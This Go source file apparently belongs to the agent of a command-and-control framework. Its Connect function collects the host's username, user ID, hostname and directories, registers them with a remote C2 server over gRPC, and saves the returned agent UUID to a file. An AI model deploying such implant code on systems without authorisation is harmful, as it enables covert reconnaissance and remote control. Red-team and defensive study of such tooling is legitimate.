package main

import (
	"context"
	"fmt"
	pb "github.com/chopper-c2-framework/c2-chopper/grpc/proto"
	"io"
	"log"
	"os"
	"os/user"
	"time"
)

func loadUUID() (string, error) {
	file, err := os.OpenFile(UUID_FILE, os.O_RDONLY, 0644)
	if err != nil {
		if os.IsNotExist(err) {
			return "", nil
		}

		fmt.Println("Error opening file:", err)
		return "", err
	}
	defer file.Close()

	// Check if the file is empty
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println("Error getting file info:", err)
		return "", err
	}

	if fileInfo.Size() == 0 {
		fmt.Println("The file is empty")
		return "", nil
	}

	content, err := io.ReadAll(file)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return "", err
	}

	return string(content), nil
}

func updateUUID(uuid string) error {
	return os.WriteFile(UUID_FILE, []byte(uuid), 0644)
}

func Connect(services *Services) *AgentInfo {
	uuid, _ := loadUUID()
	currUser, _ := user.Current()
	username := currUser.Username
	userId := currUser.Uid
	hostname, _ := os.Hostname()
	homeDir, _ := os.UserHomeDir()
	cwd, _ := os.Getwd()

	fmt.Println(uuid, username, userId)
	fmt.Println("Hostname:", hostname)

	agent := &pb.Agent{
		Hostname: hostname,
		Username: username,
		UserId:   userId,
		Cwd:      cwd,
	}

	if len(uuid) != 0 {
		agent.Id = uuid
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	response, err := services.AgentService.Connect(ctx, &pb.AgentConnectionRequest{Data: agent})
	if err != nil {
		log.Panic("error registering connection:", err)
		return nil
	}

	newUUID := response.GetUuid()
	fmt.Println(response)

	if newUUID != uuid {
		uuid = newUUID
		updateUUID(newUUID)
	}

	return &AgentInfo{
		Uuid:     uuid,
		Username: username,
		UserId:   userId,
		Hostname: hostname,
		HomeDir:  homeDir,
		Cwd:      cwd,
	}
}
